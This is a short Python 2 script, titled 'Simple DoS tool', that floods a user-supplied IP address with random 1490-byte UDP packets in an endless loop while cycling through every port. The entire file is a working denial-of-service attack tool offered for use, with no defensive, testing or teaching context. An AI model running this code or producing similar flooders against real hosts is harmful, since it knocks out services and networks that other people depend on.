import os
import sys
import random
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print "--Simple DoS tool--"
ip = raw_input("~ IP:  ")
port = input("~ Port:  ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s sockets for %s port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
